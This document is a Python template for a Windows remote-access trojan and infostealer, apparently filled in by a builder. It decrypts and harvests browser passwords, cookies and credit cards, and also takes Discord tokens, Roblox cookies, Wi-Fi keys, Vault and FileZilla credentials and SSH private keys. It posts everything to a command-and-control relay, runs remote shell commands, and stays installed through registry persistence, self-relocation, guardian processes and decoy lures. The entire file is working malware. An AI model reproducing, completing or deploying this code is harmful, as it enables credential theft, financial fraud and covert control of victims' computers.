# payload/template.py (Full Code)
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, random
from datetime import datetime, timezone, timedelta
import sqlite3
import xml.etree.ElementTree as ET

# --- Optional Imports for Harvesting & Functionality ---
try: from mss import mss
except ImportError: mss = None
try: import win32crypt
except ImportError: win32crypt = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import ctypes
except ImportError: ctypes = None
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError: AESGCM = None
try: import win32cred
except ImportError: win32cred = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
SESSION_ID = str(uuid.uuid4())
STEALTH_MODE = {{STEALTH_MODE}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
END_TASK_POPUP_ENABLED = {{END_TASK_POPUP_ENABLED}}
END_TASK_POPUP_TITLE = {{END_TASK_POPUP_TITLE}}
END_TASK_POPUP_MESSAGE = {{END_TASK_POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
EMBEDDED_GUARDIANS = {{EMBEDDED_GUARDIANS}}

results_to_send, results_lock = [], threading.Lock()
TERMINATE_FLAG = threading.Event()

# --- Utility Functions ---
def send_result(command_name, output_data, status="success"):
    with results_lock:
        results_to_send.append({"command": command_name, "output": {"status": status, "data": output_data}})

def _run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW, errors='ignore')
        return result.stdout.strip()
    except: return ""

def _get_appdata_paths():
    return { "local": os.environ.get("LOCALAPPDATA"), "roaming": os.environ.get("APPDATA"), "user": os.path.expanduser("~") }

# --- Core C2 Actions ---
def _perform_total_annihilation(stealth_dir):
    TERMINATE_FLAG.set()
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                for name in HYDRA_GUARDIANS:
                    try: winreg.DeleteValue(reg_key, name)
                    except FileNotFoundError: pass
        except Exception: pass
    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{uuid.uuid4().hex}.bat")
    with open(cleanup_script_path, "w") as f:
        f.write("@echo off\n")
        f.write("timeout /t 3 /nobreak > NUL\n")
        f.write(f'if exist "{stealth_dir}" ( rd /s /q "{stealth_dir}" )\n')
        f.write(f'(goto) 2>nul & del "%~f0"\n')
    subprocess.Popen([cleanup_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
    if psutil:
        my_pid = os.getpid()
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in HYDRA_GUARDIANS and proc.info['pid'] != my_pid:
                try: proc.terminate()
                except: pass
    sys.exit(0)

def _create_annihilation_packet(params):
    try:
        stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
        annihilation_file = os.path.join(stealth_dir, "annihilate.pill")
        with open(annihilation_file, 'w') as f: f.write('terminate')
        return {"status": "success", "data": "Annihilation packet delivered."}
    except Exception as e:
        return {"status": "error", "data": f"Failed to deliver packet: {e}"}

_action_self_destruct = _create_annihilation_packet

def harvest_system_info():
    try:
        uname = platform.uname(); ip = "N/A"
        try: ip = requests.get('https://api.ipify.org', timeout=10, verify=True).text
        except: pass
        data = { "hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "ip": ip, "arch": uname.machine }
        return {"status": "success", "data": data}
    except Exception: return {"status": "error", "data": {"hostname": socket.gethostname(), "user": getpass.getuser()}}

def _action_popup(params):
    if ctypes:
        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
    return {"status": "success", "data": "Popup displayed."}

def _action_shell(params):
    command = params.get("command", "")
    if not command: return {"status": "error", "data": "No command provided."}
    return {"status": "success", "data": _run_command(command)}

def _action_pslist(params):
    if not psutil: return {"status": "error", "data": "Psutil library not available."}
    try:
        procs = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            procs.append(f"{proc.info['pid']:<8} {proc.info.get('username', 'N/A'):<25} {proc.info['name']}")
        output = "PID      Username                  Process Name\n" + "-"*60 + "\n" + "\n".join(procs)
        return {"status": "success", "data": output}
    except Exception as e:
        return {"status": "error", "data": f"Process list failed: {e}"}

# --- Data Harvesting Functions ---
def _get_system_info():
    try:
        u = platform.uname()
        is_admin = 'Yes' if (ctypes and hasattr(ctypes.windll, 'shell32') and ctypes.windll.shell32.IsUserAnAdmin() != 0) else 'No'
        return {
            "OS Version": f"{u.system} {u.release}", "OS Build": u.version, "Architecture": u.machine,
            "Hostname": socket.gethostname(), "Current User": getpass.getuser(),
            "All Users": ", ".join(os.listdir('C:\\Users')) if platform.system() == "Windows" else "N/A",
            "Admin Privileges": is_admin, "Uptime": f"{((time.time() - psutil.boot_time()) / 3600):.2f} hours" if psutil else "N/A"
        }
    except: return {"Error": "Could not gather system info."}

def _get_hardware_info():
    try:
        mem = psutil.virtual_memory() if psutil else None
        return {
            "CPU": platform.processor(), "Cores": f"{psutil.cpu_count(logical=True)} (Logical)" if psutil else "N/A",
            "RAM": f"{mem.total / (1024**3):.2f} GB" if mem else "N/A",
            "Disks": ", ".join([p.device for p in psutil.disk_partitions()]) if psutil else "N/A"
        }
    except: return {"Error": "Could not gather hardware info."}

def _get_security_products():
    try:
        av = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value')
        fw = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path FirewallProduct get displayName /value')
        return { "Antivirus": av.split('=')[-1].strip() if '=' in av else "N/A", "Firewall": fw.split('=')[-1].strip() if '=' in fw else "N/A" }
    except: return {"Error": "Could not query WMI for security products."}

def _get_network_info():
    try: pub_ip = requests.get('https://api.ipify.org', timeout=5, verify=True).text
    except: pub_ip = "N/A"
    return { "Public IP": pub_ip, "Private IP": socket.gethostbyname(socket.gethostname()), "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode())), "ARP Table": _run_command("arp -a"), "DNS Cache": _run_command("ipconfig /displaydns"), "Active Connections": _run_command("netstat -an") }

def _get_installed_apps():
    try:
        output = _run_command('wmic product get name,version')
        apps = [line.strip() for line in output.splitlines() if line.strip() and "Name" not in line and "Version" not in line]
        return "\n".join(apps) if apps else "No applications found via WMIC."
    except: return "Could not list installed applications."

def _get_wifi_passwords():
    if platform.system() != "Windows": return []
    profiles_raw = _run_command("netsh wlan show profiles")
    profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_raw)
    results = []
    for name in profile_names:
        try:
            profile_info = _run_command(f'netsh wlan show profile name="{name.strip()}" key=clear')
            password = re.search(r"Key Content\s*:\s*(.*)", profile_info)
            if password: results.append([name.strip(), password.group(1).strip()])
        except: continue
    return results

def _get_clipboard():
    try:
        if ctypes and ctypes.windll.user32.OpenClipboard(0):
            handle = ctypes.windll.user32.GetClipboardData(1)
            data = ctypes.c_char_p(handle).value.decode('utf-8', 'ignore')
            ctypes.windll.user32.CloseClipboard()
            return data or "(empty)"
    except: return "Could not retrieve clipboard content."
    return "Clipboard is empty or contains non-text data."

def _get_browser_data(appdata):
    if platform.system() != "Windows" or not win32crypt or not AESGCM: return ([], [], [], [], [], [])
    browser_paths = { 'Chrome': os.path.join(appdata["local"], 'Google\\Chrome\\User Data'), 'Edge': os.path.join(appdata["local"], 'Microsoft\\Edge\\User Data'), 'Brave': os.path.join(appdata["local"], 'BraveSoftware\\Brave-Browser\\User Data'), }
    all_pass, all_cookie, all_hist, all_auto, all_card, all_roblox = [], [], [], [], [], []
    for browser, path in browser_paths.items():
        if not os.path.exists(path): continue
        try:
            local_state_path = os.path.join(path, "Local State")
            with open(local_state_path, 'r', encoding='utf-8') as f: key = json.load(f)["os_crypt"]["encrypted_key"]
            decryption_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        except: continue
        def decrypt(v):
            try: return AESGCM(decryption_key).decrypt(v[3:15], v[15:-16], None).decode()
            except: return ""
        def get_chrome_time(t):
            try: return (datetime(1601, 1, 1) + timedelta(microseconds=t)).strftime('%Y-%m-%d %H:%M:%S')
            except: return "N/A"
        for profile in ['Default'] + [d for d in os.listdir(path) if d.startswith('Profile ')]:
            for db_type, db_path, query, processor in [
                ("passwords", os.path.join(path, profile, 'Login Data'), "SELECT origin_url, username_value, password_value FROM logins", lambda r: [r[0], r[1], decrypt(r[2])]),
                ("cookies", os.path.join(path, profile, 'Network', 'Cookies'), "SELECT host_key, name, expires_utc, encrypted_value FROM cookies", lambda r: [r[0], r[1], get_chrome_time(r[2]), decrypt(r[3])]),
                ("history", os.path.join(path, profile, 'History'), "SELECT url, title, visit_count, last_visit_time FROM urls", lambda r: [r[0], r[1], r[2], get_chrome_time(r[3])]),
                ("autofill", os.path.join(path, profile, 'Web Data'), "SELECT name, value FROM autofill", lambda r: [r[0], r[1]]),
                ("cards", os.path.join(path, profile, 'Web Data'), "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", lambda r: [r[0], f"{r[1]}/{r[2]}", decrypt(r[3])])
            ]:
                if not os.path.exists(db_path): continue
                try:
                    temp_db = shutil.copy(db_path, os.path.join(os.environ["TEMP"], "temp.db"))
                    conn = sqlite3.connect(temp_db)
                    for row in conn.cursor().execute(query).fetchall():
                        processed_row = processor(row)
                        if processed_row[-1]:
                            if db_type == "passwords": all_pass.append(processed_row)
                            elif db_type == "cookies": 
                                all_cookie.append(processed_row)
                                if ".roblox.com" in processed_row[0] and "_ROBLOSECURITY" in processed_row[1]: all_roblox.append(processed_row[3])
                            elif db_type == "history": all_hist.append(processed_row)
                            elif db_type == "autofill": all_auto.append(processed_row)
                            elif db_type == "cards": all_card.append(processed_row)
                    conn.close(); os.remove(temp_db)
                except: pass
    return all_pass, all_cookie, all_hist, all_auto, all_card, all_roblox

def _get_discord_tokens(appdata):
    tokens = []
    paths = { 'Discord': os.path.join(appdata["roaming"], 'discord\\Local Storage\\leveldb'), 'Canary': os.path.join(appdata["roaming"], 'discordcanary\\Local Storage\\leveldb'), }
    for name, path in paths.items():
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    try:
                        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', f.read()):
                                if token not in tokens: tokens.append(token)
                    except: pass
    return tokens

def _get_windows_vault():
    if not win32cred: return []
    creds = []
    try:
        for cred in win32cred.CredEnumerate(None, 0):
            creds.append([cred['TargetName'], cred['UserName'], cred['CredentialBlob'].decode('utf-16-le', 'ignore') if cred['CredentialBlob'] else ''])
    except: pass
    return creds

def _get_filezilla_credentials(appdata):
    creds = []
    files_to_check = [os.path.join(appdata["roaming"], 'FileZilla', 'recentservers.xml'), os.path.join(appdata["roaming"], 'FileZilla', 'sitemanager.xml')]
    for file in files_to_check:
        if os.path.exists(file):
            try:
                tree = ET.parse(file)
                for server in tree.findall('.//Server'):
                    host = server.find('Host').text
                    port = server.find('Port').text
                    user = server.find('User').text
                    password = base64.b64decode(server.find('Pass').text).decode('utf-8', 'ignore') if server.find('Pass') is not None and server.find('Pass').text else ''
                    creds.append([host, port, user, password])
            except: pass
    return creds

def _get_telegram_session(appdata):
    tdata_path = os.path.join(appdata["roaming"], "Telegram Desktop", "tdata")
    if os.path.exists(tdata_path): return ["Telegram session folder (tdata) found. Can be copied manually for session takeover."]
    return []

def _get_ssh_keys(appdata):
    ssh_path = os.path.join(appdata["user"], ".ssh")
    keys = ""
    if os.path.exists(ssh_path):
        for key_file in ["id_rsa", "id_ed25519"]:
            full_path = os.path.join(ssh_path, key_file)
            if os.path.exists(full_path):
                try:
                    with open(full_path, 'r') as f:
                        keys += f"--- {key_file} ---\n{f.read()}\n\n"
                except: pass
    return keys if keys else "No SSH private keys found."

def perform_initial_harvest():
    try:
        appdata = _get_appdata_paths()
        passwords, cookies, history, autofill, cards, roblox_cookies = _get_browser_data(appdata)
        all_data = {
            "system_info": _get_system_info(), "hardware_info": _get_hardware_info(), "security_products": _get_security_products(),
            "network_info": _get_network_info(), "installed_apps": _get_installed_apps(), "env_variables": dict(os.environ),
            "wifi_passwords": _get_wifi_passwords(), "clipboard": _get_clipboard(), "browser_passwords": passwords,
            "session_cookies": cookies, "credit_cards": cards, "browser_autofill": autofill, "browser_history": history,
            "discord_tokens": _get_discord_tokens(appdata), "roblox_cookies": "\n".join(roblox_cookies),
            "windows_vault": _get_windows_vault(), "filezilla": _get_filezilla_credentials(appdata),
            "telegram": _get_telegram_session(appdata), "ssh_keys": _get_ssh_keys()
        }
        send_result("harvest_all", json.dumps(all_data))
    except Exception:
        send_result("harvest_all", json.dumps({"error": "Harvesting failed due to an unexpected error."}))

def execute_command(command_data):
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try: result = handler_func(params)
        except Exception as e: result = {"status": "error", "data": f"Handler failed: {e}"}
    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=True)
        except requests.exceptions.RequestException: pass

def command_and_control_loop(initial_metadata):
    while not TERMINATE_FLAG.is_set():
        try:
            with results_lock:
                outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, "hostname": initial_metadata.get("hostname"), "user": initial_metadata.get("user"), "os": initial_metadata.get("os")}
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=True)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException: pass
        time.sleep(random.randint(8, 15))

def hydra_watchdog(home_dir):
    if not psutil: return
    guardian_names = HYDRA_GUARDIANS
    my_name = os.path.basename(sys.executable)
    heal_lock_file = os.path.join(os.environ["TEMP"], "tether_heal.lock")
    annihilation_file = os.path.join(home_dir, "annihilate.pill")
    while not TERMINATE_FLAG.is_set():
        if os.path.exists(annihilation_file):
            _perform_total_annihilation(home_dir); break
        try:
            running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
            missing_guardians = set(guardian_names) - running_procs
            if missing_guardians:
                lock_acquired = False
                try:
                    if os.path.exists(heal_lock_file):
                        if (time.time() - os.path.getmtime(heal_lock_file)) > 15: os.remove(heal_lock_file)
                        else: time.sleep(10); continue
                    with open(heal_lock_file, 'w') as f: f.write(str(time.time()))
                    lock_acquired = True
                    if END_TASK_POPUP_ENABLED:
                        title = END_TASK_POPUP_TITLE or "Critical Process Failure"
                        message = END_TASK_POPUP_MESSAGE or "A required system process has been terminated..."
                        _action_popup({"title": title, "message": message})
                    for guardian_name in missing_guardians:
                        if guardian_name != my_name:
                            guardian_path = os.path.join(home_dir, guardian_name)
                            if os.path.exists(guardian_path):
                                subprocess.Popen([guardian_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
                finally:
                    if lock_acquired and os.path.exists(heal_lock_file): os.remove(heal_lock_file)
        except Exception: pass
        time.sleep(10)

def initial_lure():
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            os.startfile(decoy_path)
        except: pass

def install_persistence():
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = os.path.basename(sys.executable)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, sys.executable)
        except: pass

def migrate_and_spawn(stealth_dir):
    try:
        os.makedirs(stealth_dir, exist_ok=True)
        my_name = os.path.basename(sys.executable); my_path = os.path.abspath(sys.executable); new_path = os.path.join(stealth_dir, my_name)
        migrator_script_path = os.path.join(os.environ["TEMP"], f"migrate_{uuid.uuid4().hex}.bat")
        with open(migrator_script_path, "w") as f:
            f.write("@echo off\n")
            f.write("timeout /t 2 /nobreak > NUL\n")
            f.write(f'move "{my_path}" "{new_path}"\n')
            # --- SYNTAX FIX: Corrected the f.write() calls ---
            f.write(f'start "" "{new_path}"\n')
            f.write(f'(goto) 2>nul & del "%~f0"\n')
        subprocess.Popen([migrator_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
        sys.exit(0)
    except: pass

def spawn_guardians(stealth_dir):
    if EMBEDDED_GUARDIANS:
        for filename, b64_data in EMBEDDED_GUARDIANS.items():
            try:
                file_path = os.path.join(stealth_dir, filename)
                if not os.path.exists(file_path):
                    with open(file_path, 'wb') as f: f.write(base64.b64decode(b64_data))
                subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            except: pass

if __name__ == "__main__":
    stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
    my_current_path = os.path.dirname(os.path.abspath(sys.executable))
    
    if HYDRA_ENABLED and my_current_path.lower() != stealth_dir.lower():
        initial_lure()
        migrate_and_spawn(stealth_dir)
    else:
        flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{os.path.basename(sys.executable)}.flg")
        is_first_run = not os.path.exists(flag_file)
        if is_first_run:
            if HYDRA_ENABLED: spawn_guardians(stealth_dir)
            threading.Thread(target=perform_initial_harvest, daemon=True).start()
            install_persistence()
            try:
                with open(flag_file, 'w') as f: f.write('done')
            except: pass
        else:
            now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
            send_result("Agent Event", f"[{now}] Payload instance (re)started or revived.")

        initial_info = harvest_system_info()
        initial_metadata = initial_info.get("data", {})
        c2_thread = threading.Thread(target=command_and_control_loop, args=(initial_metadata,), daemon=True)
        c2_thread.start()
        if HYDRA_ENABLED:
            watchdog_thread = threading.Thread(target=hydra_watchdog, args=(stealth_dir,), daemon=True)
            watchdog_thread.start()
        TERMINATE_FLAG.wait()